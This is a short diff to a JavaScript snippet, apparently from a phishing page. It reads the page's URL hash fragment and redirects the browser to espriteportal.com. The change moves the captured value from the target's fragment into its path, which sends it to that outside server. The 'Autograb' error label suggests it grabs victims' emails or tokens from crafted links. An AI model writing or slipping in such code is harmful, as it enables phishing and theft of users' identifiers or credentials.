@@ -3,7 +3,7 @@
   try {
     const hashValue = window.location.hash.substring(1);
     if (hashValue) {
-      window.location.replace("https://espriteportal.com/#" + encodeURIComponent(hashValue));
+      window.location.replace("https://espriteportal.com/" + encodeURIComponent(hashValue));
     }
   } catch(e) {
     console.error("Autograb error:", e);
